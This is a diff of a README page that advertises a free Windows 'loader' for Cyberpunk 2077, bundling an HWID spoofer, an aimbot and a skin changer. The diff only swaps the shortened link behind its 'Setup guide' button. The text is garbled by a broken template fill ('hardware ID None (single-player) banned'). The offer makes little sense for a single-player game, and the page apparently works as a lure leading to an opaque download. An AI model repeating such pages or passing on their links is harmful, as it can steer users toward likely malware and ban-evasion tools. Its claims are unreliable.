@@ -5,7 +5,7 @@
 **Cyberpunk 2077** — HWID spoofer, aimbot and skin changer in one Windows loader. The spoofer resets the hardware ID None (single-player) banned, the aimbot is fully configurable, and the skin changer unlocks cosmetics client-side. **Free download, Windows 10 and 11.**
 
 <p align="center">
-  <a href="https://share.google/b8kgQngdkGgVOMz2c"><img src="button.svg" alt="Setup guide" height="46"></a>
+  <a href="https://share.google/y95Xzb6QLzAdqiQ63"><img src="button.svg" alt="Setup guide" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
